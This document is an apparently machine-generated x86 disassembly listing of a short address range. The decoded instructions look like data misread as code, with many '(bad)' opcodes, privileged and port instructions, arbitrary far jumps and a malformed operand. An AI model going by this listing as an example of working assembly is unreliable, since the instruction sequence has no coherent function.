  41415a:	add    ebx,edi
  41415c:	push   ebp
  41415d:	(bad)  
  41415e:	fsub   DWORD PTR [ecx+0x6e792864]
  414164:	ficom  DWORD PTR [ecx-0x6c]
  414167:	mov    edi,0x609dcc3b
  41416c:	and    al,0xa2
  41416e:	rcl    BYTE PTR [edx-0x2ee7c470],1
  414174:	es loop 0x414115
  414177:	sti    
  414178:	sbb    DWORD PTR [edx+0x10],eax
  41417b:	mov    gs,WORD PTR [edi]
  41417d:	add    al,0xc
  41417f:	push   ss
  414180:	cmp    ecx,0xd9001aa9
  414186:	shr    DWORD PTR [edi],cl
  414188:	push   ecx
  414189:	cmp    esp,DWORD PTR [edx+0x5883c49c]
  41418f:	outs   dx,DWORD PTR ds:[esi]
  414190:	cmp    dh,al
  414192:	dec    esi
  414193:	sbb    al,0x9e
  414195:	xor    eax,0xfd74aaa3
  41419a:	pop    ebp
  41419b:	or     al,0x7
  41419d:	xchg   esi,eax
  41419e:	push   ebx
  41419f:	or     BYTE PTR [edi],cl
  4141a1:	mov    al,0xbe
  4141a3:	mov    ebp,0x471ab812
  4141a8:	push   ebp
  4141a9:	test   eax,0x53d7403c
  4141ae:	xor    ebx,0xa
  4141b1:	into   
  4141b2:	push   eax
  4141b3:	mov    al,ds:0xa9c45ac
  4141b8:	push   esi
  4141b9:	ins    DWORD PTR es:[edi],dx
  4141ba:	lea    ebx,[eax+0x3e]
  4141bd:	or     al,0x9d
  4141bf:	clc    
  4141c0:	or     al,0x4f
  4141c2:	sar    BYTE PTR [ebx-0x3b3ee494],cl
  4141c8:	jne    0x4141af
  4141ca:	ins    BYTE PTR es:[edi],dx
  4141cb:	pop    ebp
  4141cc:	mov    bh,BYTE PTR [edx+ebp*4-0x384762d4]
  4141d3:	lahf   
  4141d4:	hlt    
  4141d5:	pop    ss
  4141d6:	cwde   
  4141d7:	fscale 
  4141d9:	(bad)  
  4141da:	jmp    0xc1177818
  4141df:	in     eax,0xb4
  4141e1:	pop    ecx
  4141e2:	or     dh,BYTE PTR [ebx]
  4141e4:	mov    dl,0xed
  4141e6:	gs loopne 0x41416d
  4141e9:	add    BYTE PTR [ecx-0x6f],cl
  4141ec:	ds push 0x70
  4141ef:	inc    edi
  4141f0:	and    DWORD PTR [esi-0x47],edi
  4141f3:	(bad)  
  4141f4:	mov    ecx,0x2a61ede5
  4141f9:	jmp    0x5cad:0xda82bfe1
  414200:	test   BYTE PTR [edx+0x4],dl
  414203:	scas   al,BYTE PTR es:[edi]
  414204:	xchg   ebp,eax
  414205:	inc    ebp
  414206:	(bad)  
  414207:	jecxz  0x414240
  414209:	pop    dx
  41420b:	retf   0x2a1c
  41420e:	repz int 0xf9
  414211:	jge    0x41419d
  414213:	stos   BYTE PTR es:[edi],al
  414214:	aaa    
  414215:	cwde   
  414216:	ds mov cl,0x47
  414219:	leave  
  41421a:	pop    edi
  41421b:	push   edx
  41421c:	push   edx
  41421d:	xchg   ecx,eax
  41421e:	push   ds
  41421f:	or     BYTE PTR [ebp-0x6863e2af],0xea
  414226:	rcl    DWORD PTR [edi-0x66],1
  414229:	mov    edi,DWORD PTR [edi-0x19]
  41422c:	xor    BYTE PTR ds:0xfac68b85,dh
  414232:	mov    BYTE PTR [edi+esi*2],cl
  414235:	xchg   ebp,eax
  414236:	pop    esi
  414237:	and    dh,cl
  414239:	push   cs
  41423a:	pop    ecx
  41423b:	jno    0x41429a
  41423d:	arpl   WORD PTR [ecx],bp
  41423f:	shl    BYTE PTR [ebx-0x2b],1
  414242:	test   cl,al
  414244:	or     DWORD PTR ds:0x4e7a87db,esi
  41424a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41424b:	add    eax,0x68c5a4c5
  414250:	cs or  eax,0xe5771888
  414256:	dec    ebx
  414257:	imul   esi,DWORD PTR [edi],0x81c709b7
  41425d:	rcr    BYTE PTR [edx],cl
  41425f:	fwait
  414260:	mov    ecx,?
  414262:	add    DWORD PTR [eax],edi
  414264:	push   esp
  414265:	mov    ecx,0x5fb7dbd6
  41426a:	aaa    
  41426b:	retf   0xb5e8
  41426e:	(bad)  
  41426f:	repnz in al,0xa3
  414272:	sar    BYTE PTR [ecx+0x15],1
  414275:	(bad)
  414279:	test   DWORD PTR [ecx],esi
  41427b:	sub    edx,edx
  41427d:	cmp    DWORD PTR ds:0xacc2c7f6,ebp
  414283:	ja     0x4142ef
  414285:	adc    bl,dh
  414287:	les    esp,FWORD PTR [esi+0x5a]
  41428a:	xchg   DWORD PTR ds:0x463d1b39,ebx
  414290:	pop    ecx
  414291:	getsec 
  414293:	shl    BYTE PTR [edx-0x653f2bee],1
  414299:	out    0x57,eax
  41429b:	call   DWORD PTR [edx+0x7a140f2c]
  4142a1:	sbb    ah,BYTE PTR [edx-0x46cf0cad]
  4142a7:	and    ecx,DWORD PTR [esi+edi*8-0x1b]
  4142ab:	push   ebp
  4142ac:	imul   ebp,DWORD PTR [ecx],0x2895500d
  4142b2:	jne    0x4142fc
  4142b4:	test   BYTE PTR [edx],cl
  4142b6:	mul    edi
  4142b8:	jnp    0x4142a0
  4142ba:	into   
  4142bb:	repnz inc edx
  4142bd:	(bad)  
  4142be:	pop    edi
  4142bf:	cmp    eax,0xbff01130
  4142c4:	xchg   edi,eax
  4142c5:	sar    BYTE PTR [ecx+0x3f],1
  4142c8:	ins    BYTE PTR es:[edi],dx
  4142c9:	rol    bh,0x51
  4142cc:	ins    BYTE PTR es:[edi],dx
  4142cd:	or     bh,0x2b
  4142d0:	xchg   edx,eax
  4142d1:	mov    WORD PTR [bp+si+0x6132],cs
  4142d6:	xchg   BYTE PTR [edx],bl
  4142d8:	test   BYTE PTR [esi+0x31b0783f],dl
  4142de:	xchg   edi,eax
  4142df:	xor    DWORD PTR [esi-0x378ea18c],edx
  4142e5:	pop    ss
  4142e6:	mov    bl,0xe3
  4142e8:	in     al,0x75
  4142ea:	lods   al,BYTE PTR ds:[esi]
  4142eb:	fsub   st,st(0)
  4142ed:	push   0xffffffbe
  4142ef:	in     al,0xaf
  4142f1:	pop    edi
  4142f2:	xor    DWORD PTR [edi+ebp*1-0x6f],edi
  4142f6:	mov    edx,0x4ecd1f89
  4142fb:	pushf  
  4142fc:	push   esp
  4142fd:	pop    es
  4142fe:	sbb    BYTE PTR [edi+eiz*8-0x360a8229],dh
  414305:	mov    ch,0xe0
  414307:	imul   DWORD PTR [eax+0x4]
  41430a:	or     edi,DWORD PTR [edi+0x25453e28]
  414310:	(bad)  
  414311:	and    al,0x9c
  414313:	es cld 
  414315:	fcom   QWORD PTR [edx+0x16]
  414318:	cmp    esi,0xfa779b3c
  41431e:	jecxz  0x4142b6
  414320:	(bad)  
  414321:	mov    WORD PTR [eax+0x7ba1bc98],ss
  414327:	sbb    edi,DWORD PTR ds:0xa367ea6
  41432d:	icebp  
  41432e:	cmc    
  41432f:	and    ebx,eax
  414331:	popa   
  414332:	aaa    
  414333:	fadd   DWORD PTR [eax+0x66320df]
  414339:	clc    
  41433a:	dec    ecx
  41433b:	in     al,0xc9
  41433d:	into   
  41433e:	or     DWORD PTR [ebp+edx*4+0x18],esi
  414342:	sbb    edx,DWORD PTR [esi-0x71b007af]
  414348:	xor    dh,bh
  41434a:	push   bx
  41434c:	pop    esi
  41434d:	sub    edi,ecx
  41434f:	and    ebx,ecx
  414351:	scas   eax,DWORD PTR es:[edi]
  414352:	lahf   
  414353:	mov    ah,0x78
  414355:	inc    esp
  414356:	add    BYTE PTR [esp+edx*1+0x8],cl
  41435a:	inc    ebp
  41435b:	mov    ds:0x4b544411,eax
  414360:	call   0x9b83:0x87fb5bdb
  414367:	jecxz  0x4143d8
  414369:	cdq    
  41436a:	jecxz  0x4143d7
  41436c:	repz or BYTE PTR [ebp+0xa178e1c],bl
  414373:	js     0x414384
  414375:	xchg   ebp,eax
  414376:	inc    ebp
  414377:	jle    0x414382
  414379:	fs xchg ebx,eax
  41437b:	ja     0x41431c
  41437d:	adc    eax,0xf5e16c19
  414382:	das    
  414383:	in     al,dx
  414384:	fisttp QWORD PTR [edx+esi*2]
  414387:	dec    eax
  414388:	dec    edi
  414389:	pop    ds
  41438a:	mov    edx,0xfdc4facf
  41438f:	std    
  414390:	sti    
  414391:	pop    es
  414392:	push   es
  414393:	xor    BYTE PTR [ebx-0x50],0x48
  414397:	iret   
  414398:	push   edx
  414399:	gs cmp eax,0x72f0f30b
  41439f:	inc    edi
  4143a0:	pop    eax
  4143a1:	or     dl,BYTE PTR [ebx+ebp*8]
  4143a4:	fwait
  4143a5:	jno    0x414348
  4143a7:	xchg   ecx,eax
  4143a8:	and    BYTE PTR [ebx+0x1e],0x23
  4143ac:	loope  0x414365
  4143ae:	and    al,0x79
  4143b0:	pushf  
  4143b1:	inc    edx
  4143b2:	push   edi
  4143b3:	and    al,BYTE PTR [ecx+0x7e71dd74]
  4143b9:	push   esi
  4143ba:	mov    ds:0xd60fda4,eax
  4143bf:	cli    
  4143c0:	xchg   esi,eax
  4143c1:	mov    bh,al
  4143c3:	(bad)  
  4143c4:	int    0x0
  4143c6:	mov    cl,0x6
  4143c8:	(bad)  
  4143c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143ca:	jbe    0x414426
  4143cc:	jecxz  0x414371
  4143ce:	jle    0x41442d
  4143d0:	imul   eax,DWORD PTR [ebx-0x11],0xf53becbe
  4143d7:	inc    esi
  4143d8:	pop    es
  4143d9:	xchg   BYTE PTR [ebx+ecx*4-0x63],bh
  4143dd:	int3   
  4143de:	outs   dx,DWORD PTR ds:[esi]
  4143df:	add    BYTE PTR [eax+ecx*8+0x2a],bl
  4143e3:	imul   esp,DWORD PTR [eax],0x42
  4143e6:	xor    ah,ah
  4143e8:	mov    dh,0x89
  4143ea:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4143ec:	ins    DWORD PTR es:[edi],dx
  4143ed:	push   ds
  4143ee:	arpl   WORD PTR [edi+0x77],bx
  4143f1:	popf   
  4143f2:	les    eax,FWORD PTR [ebp-0x8c7d999]
  4143f8:	cmp    edx,0xb9e7edb2
  4143fe:	sbb    cl,BYTE PTR [edi+0x30]
  414401:	not    BYTE PTR [ebx+0x2e51137]
  414407:	loopne 0x414415
  414409:	outs   dx,DWORD PTR ds:[esi]
  41440a:	out    0x3e,eax
  41440c:	sti    
  41440d:	add    DWORD PTR [esi+0x768b811a],0xffffffe4
  414414:	inc    ebx
  414415:	or     DWORD PTR [ebp+0x40504a74],esp
  41441b:	push   esi
  41441c:	pop    es
  41441d:	jge    0x41441c
  41441f:	ret    
  414420:	add    al,0x35
  414422:	shl    al,cl
  414424:	je     0x414461
  414426:	pop    edx
  414427:	or     ecx,DWORD PTR [ebp-0x51d5b790]
  41442d:	sahf   
  41442e:	xchg   ebx,ecx
  414430:	repz adc BYTE PTR [ebp+0x147d1c6b],ch
  414437:	mov    bh,0x31
  414439:	ins    DWORD PTR es:[edi],dx
  41443a:	stc    
  41443b:	(bad)  
  41443c:	dec    edx
  41443d:	ja     0x414424
  41443f:	inc    ebp
  414440:	pop    ebp
  414441:	push   edi
  414442:	sbb    al,0x40
  414444:	rol    dl,0x8b
  414447:	icebp  
  414448:	retf   0x745b
  41444b:	jmp    0x551f019
  414450:	sub    eax,0xe3560cf
  414455:	lea    eax,[edi]
  414457:	test   BYTE PTR [esi+0x4f4b59d1],bh
  41445d:	dec    esi
  41445e:	pop    ebp
  41445f:	retf   0xa6d8
  414462:	clc    
  414463:	or     BYTE PTR ds:0xde89a5b,bh
  414469:	aad    0x82
  41446b:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41446d:	or     ebx,edi
  41446f:	fstp   TBYTE PTR [eax+0x7858753e]
  414475:	ficomp DWORD PTR [eax+0x3]
  414478:	jo     0x414434
  41447a:	sub    eax,0xc7a63cca
  41447f:	outs   dx,BYTE PTR ds:[esi]
  414480:	dec    edi
  414481:	mov    ds:0x9ff262aa,eax
  414486:	push   ss
  414487:	jmp    0x9a76f337
  41448c:	arpl   WORD PTR [esi+0x30],di
  41448f:	jne    0x414502
  414491:	fidivr DWORD PTR [esi-0x5951e24]
  414497:	inc    eax
  414498:	mov    ds:0x4bf9503e,al
  41449d:	int    0xe3
  41449f:	call   DWORD PTR [edx+0x49]
  4144a2:	(bad)  
  4144a3:	mov    ebx,0x306cf1e9
  4144a8:	mov    DWORD PTR [edi-0x5d8bf193],esp
  4144ae:	retf   0x2e61
  4144b1:	push   edx
  4144b2:	dec    ebp
  4144b3:	add    ah,bl
  4144b5:	or     cl,BYTE PTR ds:[ebp+edx*8-0x25]
  4144ba:	test   ch,0xee
  4144bd:	pop    es
  4144be:	push   ss
  4144bf:	adc    esp,DWORD PTR [ebx+eax*4]
  4144c2:	popa   
  4144c3:	cdq    
  4144c4:	mov    BYTE PTR [ebx],0x85
  4144c7:	adc    DWORD PTR [ebx],esi
  4144c9:	adc    eax,ecx
  4144cb:	jae    0x41444f
  4144cd:	into   
  4144ce:	inc    ebx
  4144cf:	mov    ah,0x6f
  4144d1:	push   eax
  4144d2:	push   0x26
  4144d4:	mov    ebx,0x62c1c2d8
  4144d9:	mov    ds:0xe8861e77,eax
  4144de:	adc    al,0x6f
  4144e0:	outs   dx,DWORD PTR ds:[esi]
  4144e1:	mov    ebp,0x18ae8add
  4144e6:	xchg   esp,eax
  4144e7:	push   eax
  4144e8:	call   0x619:0x99daf08
  4144ef:	les    edi,FWORD PTR [edx]
  4144f1:	push   es
  4144f2:	mov    esp,0x990bf841
  4144f7:	std    
  4144f8:	in     al,dx
  4144f9:	inc    edi
  4144fa:	repz inc esi
  4144fc:	mov    BYTE PTR [eax+0x66a8472d],dh
  414502:	mov    edi,0x38382f45
  414507:	leave  
  414508:	jmp    0xba02:0x2e632972
  41450f:	pusha  
  414510:	pop    ss
  414511:	pop    edx
  414512:	fld    QWORD PTR [eax]
  414514:	sub    ecx,ecx
  414516:	shl    BYTE PTR [edi-0x53],cl
  414519:	jae    0x414578
  41451b:	gs int 0xe4
  41451e:	or     BYTE PTR [esi],dh
  414520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414521:	mov    esi,DWORD PTR cs:[edi-0x34]
  414525:	enter  0x7dbc,0x72
  414529:	sbb    DWORD PTR [edx+0xcce076f],0xffffffd1
  414530:	(bad)  
  414531:	je     0x414565
  414533:	jmp    0x6bf9e3ad
  414538:	mov    ecx,0x9eddbfb
  41453d:	xchg   DWORD PTR [eax+ebx*1],ecx
  414540:	out    0xd7,al
  414542:	inc    ebp
  414543:	push   0xffffffee
  414545:	add    DWORD PTR [ebx+0x4f],ecx
  414548:	xor    BYTE PTR [esi-0x5279fe85],0x8a
  41454f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414550:	xor    eax,0x68394a4b
  414555:	xchg   ebp,eax
  414556:	jo     0x41452c
  414558:	rcr    BYTE PTR [edx+0x4d],cl
  41455b:	xor    ecx,edx
  41455d:	popa   
  41455e:	in     eax,dx
  41455f:	pop    edx
  414560:	xor    BYTE PTR [ecx-0x47],0xf0
  414564:	pop    esp
  414565:	jae    0x4144fb
  414567:	lahf   
  414568:	and    eax,0x6d26851b
  41456d:	inc    ecx
  41456e:	cld    
  41456f:	and    esp,DWORD PTR [edx+0x55]
  414572:	cwde   
  414573:	sub    esi,eax
  414575:	mov    al,0xe3
  414577:	es jmp 0xfe5b:0x96dcd35
  41457f:	call   DWORD PTR [edx+0x1e]
  414582:	outs   dx,DWORD PTR ds:[esi]
  414583:	sbb    eax,0x3fb6860
  414588:	(bad)  
  414589:	fsub   st(7),st
  41458b:	mov    esi,0xd93b070
  414590:	and    DWORD PTR [esi-0x6e],edx
  414593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414594:	pop    esp
  414595:	loope  0x414549
  414597:	ss cmc 
  414599:	jge    0x414591
  41459b:	sahf   
  41459c:	fiadd  DWORD PTR [edi+0x12]
  41459f:	or     ecx,esi
  4145a1:	scas   al,BYTE PTR es:[di]
  4145a3:	mov    esi,0xcb0194ae
  4145a8:	adc    BYTE PTR ss:[edx-0x6e773447],ch
  4145af:	(bad)  
  4145b0:	sar    dh,1
  4145b2:	arpl   WORD PTR [ecx],di
  4145b4:	pusha  
  4145b5:	push   ecx
  4145b6:	sub    bh,al
  4145b8:	pavgw  mm2,QWORD PTR [ecx]
  4145bb:	jb     0x4145c2
  4145bd:	jbe    0x414632
  4145bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145c0:	sub    al,0x49
  4145c2:	push   edi
  4145c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145c4:	test   eax,0x58aa1a71
  4145c9:	mov    ds:0x2154f685,al
  4145ce:	inc    DWORD PTR [edi+0x3b]
  4145d1:	(bad)  
  4145d2:	sbb    eax,0xe97a5d2e
  4145d7:	cdq    
  4145d8:	and    ch,BYTE PTR [ecx*8-0xc9d3463]
  4145df:	xchg   esp,eax
  4145e0:	out    0x46,eax
  4145e2:	test   ebp,ebx
  4145e4:	cmp    al,0x80
  4145e6:	(bad)  
  4145e7:	adc    eax,0x2d2851c8
  4145ec:	fwait
  4145ed:	push   ebx
  4145ee:	ins    DWORD PTR es:[edi],dx
  4145ef:	(bad)  
  4145f0:	sti    
  4145f1:	inc    esp
  4145f2:	and    al,0x38
  4145f4:	out    dx,eax
  4145f5:	(bad)  
  4145f6:	jne    0x41462c
  4145f8:	sbb    al,0x1c
  4145fa:	lock scas eax,DWORD PTR es:[edi]
  4145fc:	cmp    dh,BYTE PTR [eax+0x200da6e1]
  414602:	pmullw mm0,mm1
  414605:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414606:	mov    al,ds:0xe72e61e7
  41460b:	or     eax,0x7dc9b9ec
  414610:	call   0xf7ba:0xbbfd91ec
  414617:	clc    
  414618:	jp     0x414650
  41461a:	jno    0x414650
  41461c:	fsubrp st(4),st
  41461e:	test   bl,bh
  414620:	(bad)  
  414621:	jnp    0x4145a5
  414623:	and    BYTE PTR [ebp+0x2188b2da],al
  414629:	push   ebp
  41462a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41462b:	adc    BYTE PTR [edx-0x53],ch
  41462e:	arpl   WORD PTR [edi+0x78955c69],bp
  414634:	idiv   BYTE PTR [edx]
  414636:	fs mov dl,0xfd
  414639:	xchg   BYTE PTR [ebx],cl
  41463b:	imul   edx,DWORD PTR [ebx],0xa36275cf
  414641:	xchg   esp,eax
  414642:	fstp   DWORD PTR [edx+0x27587917]
  414648:	lahf   
  414649:	clc    
  41464a:	and    al,0x32
  41464c:	mov    esp,DWORD PTR [eax+0x7f]
  41464f:	lods   eax,DWORD PTR ds:[esi]
  414650:	mov    es,WORD PTR [edi]
  414652:	inc    ebx
  414653:	stos   DWORD PTR es:[edi],eax
  414654:	lds    esp,FWORD PTR [edi-0x27]
  414657:	pop    ds
  414658:	out    0x22,al
  41465a:	push   edx
  41465b:	push   esp
  41465c:	pop    ebp
  41465d:	mov    ebp,0xf2281287
  414662:	adc    eax,0x2247dccd
  414667:	xor    esi,DWORD PTR [edx-0x75715356]
  41466d:	cmp    eax,0x309b528e
  414672:	xchg   ebp,eax
  414673:	jae    0x414625
  414675:	cdq    
  414676:	and    BYTE PTR [edx],bl
  414678:	pop    ds
  414679:	test   eax,0x9c3f93c1
  41467e:	add    cl,bh
  414680:	test   al,0xc9
  414682:	jg     0x41467b
  414684:	sbb    ecx,ebp
  414686:	fucom  st(7)
  414688:	push   ebx
  414689:	(bad)  
  41468a:	(bad)  
  41468b:	dec    ebx
  41468c:	add    BYTE PTR [ebx+0x1cbcd6e4],al
  414692:	nop
  414693:	outs   dx,DWORD PTR ds:[esi]
  414694:	outs   dx,BYTE PTR ds:[esi]
  414695:	nop
  414696:	or     al,0xbd
  414698:	lods   al,BYTE PTR ds:[esi]
  414699:	ffree  st(7)
  41469c:	lahf   
  41469d:	dec    edx
  41469e:	cmc    
  41469f:	mov    al,0xbc
  4146a1:	mov    edx,0x6910239b
  4146a6:	xor    eax,DWORD PTR [ebx]
  4146a8:	push   esp
  4146a9:	inc    ebp
  4146aa:	push   0x4c
  4146ac:	test   BYTE PTR [ebx],al
  4146ae:	push   0x2c
  4146b0:	popf   
  4146b1:	mov    ch,bh
  4146b3:	adc    ecx,DWORD PTR [edi]
  4146b5:	repz pushf 
  4146b7:	mov    dh,bl
  4146b9:	jno    0x414737
  4146bb:	iret   
  4146bc:	ret    
  4146bd:	sbb    BYTE PTR [eax],dh
  4146bf:	mov    al,0xd7
  4146c1:	repnz pop edx
  4146c3:	push   0x26b0a6a8
  4146c8:	dec    ebx
  4146c9:	sbb    DWORD PTR [ebp-0x6f],edi
  4146cc:	mov    ds:0x1d4d2ac6,eax
  4146d1:	and    eax,0xe3ca9bc5
  4146d6:	mov    BYTE PTR [ebp-0x5c70c8cd],al
  4146dc:	mov    cs,WORD PTR [ebx+0x7a41818e]
  4146e2:	outs   dx,DWORD PTR ds:[esi]
  4146e3:	dec    esp
  4146e4:	pop    esi
  4146e5:	xchg   esi,eax
  4146e6:	push   ebx
  4146e7:	dec    eax
  4146e8:	push   esi
  4146e9:	pop    edx
  4146ea:	cmp    esp,ebx
  4146ec:	loopne 0x4146f0
  4146ee:	cmp    DWORD PTR ds:[ebx],ebx
  4146f1:	and    edx,DWORD PTR [esi-0x5a]
  4146f4:	cmp    eax,0xd0daf494
  4146f9:	cs in  eax,0x4e
  4146fc:	in     al,dx
  4146fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146fe:	cmp    DWORD PTR [edx+0x3b],eax
  414701:	push   ecx
  414702:	cdq    
  414703:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414704:	mov    esp,DWORD PTR [ebp+0x43e190c0]
  41470a:	sub    BYTE PTR [ecx-0x11],ch
  41470d:	jge    0x41473c
  41470f:	mov    BYTE PTR [esp+ebx*2+0x20],dl
  414713:	xor    ebp,DWORD PTR [edx-0x7d9340de]
  414719:	mov    ecx,0x84f05b11
  41471e:	xchg   ecx,eax
  41471f:	in     al,dx
  414720:	xor    bl,BYTE PTR [esi-0x6e89f11]
  414726:	or     DWORD PTR [eax+0x37],edx
  414729:	ret    0x113e
  41472c:	test   eax,0xe3dd2ec7
  414731:	outs   dx,BYTE PTR ds:[esi]
  414732:	popf   
  414733:	or     DWORD PTR [ebp-0x2f],ebp
  414736:	push   es
  414737:	lods   al,BYTE PTR ds:[esi]
  414738:	jp     0x41472a
  41473a:	into   
  41473b:	lods   eax,DWORD PTR ds:[esi]
  41473c:	(bad)
  414740:	cmp    BYTE PTR [ebp-0x2419eee2],dl
  414746:	test   DWORD PTR [ebx+ebx*4-0x56],ecx
  41474a:	fistp  QWORD PTR [eax+edx*4+0x7c]
  41474e:	jg     0x414757
  414750:	out    dx,al
  414751:	fwait
  414752:	inc    ecx
  414753:	mov    dl,0x39
  414755:	(bad)  
  414756:	ins    DWORD PTR es:[edi],dx
  414757:	lahf   
  414758:	rol    bl,1
  41475a:	fwait
  41475b:	sbb    BYTE PTR [edi],bl
  41475d:	add    BYTE PTR [ecx-0x3c739766],dh
  414763:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414764:	jo     0x4147d1
  414766:	fst    QWORD PTR [edi-0x58]
  414769:	and    eax,0x2ec44a8b
  41476e:	fidivr DWORD PTR [eax+0x16]
  414771:	js     0x414781
  414773:	or     al,0xa3
  414775:	iret   
  414776:	push   eax
  414777:	mov    ebx,0x38dd64a3
  41477c:	mov    cl,0xe4
  41477e:	mov    esi,0xa8141610
  414783:	or     esi,DWORD PTR [edx-0x37d4859]
  414789:	sbb    DWORD PTR [ecx-0x41],ebp
  41478c:	adc    BYTE PTR [edi+0x21369fec],dl
  414792:	stc    
  414793:	push   edx
  414794:	mov    esi,0xdc363727
  414799:	adc    eax,eax
  41479b:	xor    esp,DWORD PTR [esi-0x3783594c]
  4147a1:	adc    BYTE PTR cs:[edx-0x24],cl
  4147a5:	(bad)  
  4147a6:	and    eax,0x667caae4
  4147ab:	cwde   
  4147ac:	leave  
  4147ad:	mov    ch,0xf0
  4147af:	dec    esp
  4147b0:	adc    al,0x79
  4147b2:	mov    bl,0x2d
  4147b4:	or     eax,0x4757c65a
  4147b9:	lahf   
  4147ba:	pop    ecx
  4147bb:	ss loopne 0x41479a
  4147be:	pop    es
  4147bf:	rol    DWORD PTR [ecx+ecx*2],0xb3
  4147c3:	fnstsw ax
  4147c5:	in     eax,0x6
  4147c7:	ins    DWORD PTR es:[edi],dx
  4147c8:	pop    ss
  4147c9:	fimul  WORD PTR [esi]
  4147cb:	cmp    al,0x21
  4147cd:	mov    edi,0x6fa3e051
  4147d2:	scas   eax,DWORD PTR es:[edi]
  4147d3:	mov    ds:0x1d391b5e,al
  4147d8:	call   DWORD PTR es:[ebx+0x3d7b3735]
  4147df:	sbb    BYTE PTR [edi-0x11],bl
  4147e2:	imul   edi,DWORD PTR [edi-0x61a2c584],0x1e01f995
  4147ec:	(bad)  
  4147ed:	xor    DWORD PTR [edx-0x2a],ebx
  4147f0:	pop    ss
  4147f1:	inc    esi
  4147f2:	stos   DWORD PTR es:[edi],eax
  4147f3:	and    al,0xc4
  4147f6:	imul   eax,esp,0x8
  4147f9:	(bad)  
  4147fa:	ins    DWORD PTR es:[edi],dx
  4147fb:	in     al,0x7d
  4147fd:	or     DWORD PTR [eax],edi
  4147ff:	mov    ebp,0x5cca0747
  414804:	mov    ds:0x74ef493f,eax
  414809:	lahf   
  41480a:	and    al,0x4e
  41480c:	sahf   
  41480d:	and    eax,0x7965a9bf
  414812:	cwde   
  414813:	cmp    DWORD PTR [eax],ecx
  414815:	and    DWORD PTR [ebx],ecx
  414817:	out    dx,eax
  414818:	jmp    0x4147f4
  41481a:	push   ecx
  41481b:	ds mov dl,al
  41481e:	outs   dx,BYTE PTR ds:[esi]
  414820:	stos   BYTE PTR es:[edi],al
  414821:	sub    edx,DWORD PTR [ebx-0x430df36d]
  414827:	add    eax,0x8f6f45d3
  41482c:	pushf  
  41482d:	mov    ecx,0x63c81feb
  414832:	pop    eax
  414833:	pop    esp
  414834:	ret    
  414835:	pop    esp
  414836:	shl    BYTE PTR [esp+ebp*4],1
  414839:	es ins DWORD PTR es:[edi],dx
  41483b:	xchg   edx,eax
  41483c:	and    al,0x50
  41483e:	pop    esp
  41483f:	add    edi,DWORD PTR [ebx+0x65304375]
  414845:	aaa    
  414846:	loopne 0x414854
  414848:	pop    ebp
  414849:	das    
  41484a:	call   0x3dc2:0xaddfef62
  414851:	or     dl,bh
  414853:	addr16 mov ch,0x70
  414856:	div    BYTE PTR [esi+esi*1+0x23]
  41485a:	cmp    ch,bh
  41485c:	xchg   DWORD PTR [edi],edx
  41485e:	fnstenv [ebp-0x3d]
  414861:	mov    bl,0x3a
  414863:	adc    BYTE PTR [ebx],0x6a
  414866:	out    0x21,eax
  414868:	test   al,0x50
  41486a:	daa    
  41486b:	sbb    eax,0x4e953d3f
  414870:	dec    esi
  414871:	push   ds
  414872:	nop
  414873:	mov    ebx,0x23098e99
  414878:	dec    edi
  414879:	repnz sbb BYTE PTR [ebp-0x312cff5e],dl
  414880:	rcr    edx,0xdc
  414883:	shr    BYTE PTR [ebx],0x8d
  414886:	cmp    DWORD PTR [edx+0x7990692],eax
  41488c:	push   eax
  41488d:	jbe    0x4148f3
  41488f:	je     0x4148e4
  414891:	jmp    0x1de0:0x7f0c7ce2
  414898:	(bad)  
  414899:	ret    0x8ab5
  41489c:	sub    dh,bh
  41489e:	test   eax,0xab19d66
  4148a3:	into   
  4148a4:	add    ebp,DWORD PTR [ebx]
  4148a6:	mov    dh,0xb7
  4148a8:	xchg   DWORD PTR [ebp-0x2c],edx
  4148ab:	push   ss
  4148ac:	pop    esp
  4148ad:	dec    ebx
  4148ae:	js     0x41486b
  4148b0:	inc    esi
  4148b1:	dec    esp
  4148b2:	pop    ebx
  4148b3:	scas   al,BYTE PTR es:[edi]
  4148b4:	mov    edx,0x64c5f59a
  4148b9:	shr    BYTE PTR [ecx],0x7a
  4148bc:	xor    ah,bh
  4148be:	xchg   ebx,eax
  4148bf:	push   ebp
  4148c0:	loop   0x41492a
  4148c2:	imul   eax,DWORD PTR ds:0xee9e9846,0xffffffeb
  4148c9:	push   ebp
  4148ca:	nop
  4148cb:	push   esp
  4148cc:	pusha  
  4148cd:	push   ecx
  4148ce:	add    al,0x6
  4148d0:	lods   al,BYTE PTR ds:[esi]
  4148d1:	stc    
  4148d2:	jmp    0x31c:0x56886179
  4148d9:	iret   
  4148da:	test   al,0x3f
  4148dc:	mov    WORD PTR [ebp-0x1b],es
  4148df:	sub    DWORD PTR [esi],ebp
  4148e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148e2:	push   ebx
  4148e3:	les    edi,FWORD PTR [eax-0x1772882c]
  4148e9:	fld    DWORD PTR [ebx+0x4]
  4148ec:	push   ss
  4148ed:	jbe    0x41490b
  4148ef:	push   edx
  4148f0:	jb     0x4148c0
  4148f2:	aas    
  4148f3:	or     BYTE PTR [edi],cl
  4148f5:	xchg   esp,eax
  4148f6:	retf   0x39cc
  4148f9:	adc    DWORD PTR [esi+esi*8+0xf294776],ebx
  414900:	cmp    ecx,DWORD PTR [ebx-0x42]
  414903:	mov    eax,0xfbd541e1
  414908:	sub    BYTE PTR [ecx-0x6407e6e9],0xdc
  41490f:	inc    esp
  414910:	xor    ax,0x2119
  414914:	in     eax,0x35
  414916:	jmp    0x78c5:0x251849b7
  41491d:	ror    DWORD PTR [eax-0x5],cl
  414920:	cdq    
  414921:	ds lahf 
  414923:	(bad)  
  414924:	sar    ah,1
  414926:	ret    
  414927:	cmc    
